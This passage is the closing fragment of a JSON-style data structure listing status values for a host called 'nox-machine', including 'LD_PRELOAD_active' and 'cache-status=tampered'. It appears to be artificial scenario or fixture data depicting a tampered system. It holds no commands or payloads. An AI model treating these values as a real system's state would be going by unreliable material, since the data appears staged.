                    "hostname=nox-machine",
                    "filesystem=ready",
                    "services=running",
                    "state=LD_PRELOAD_active",
                    "cache-status=tampered"
                ]
            ]
        }
    }

}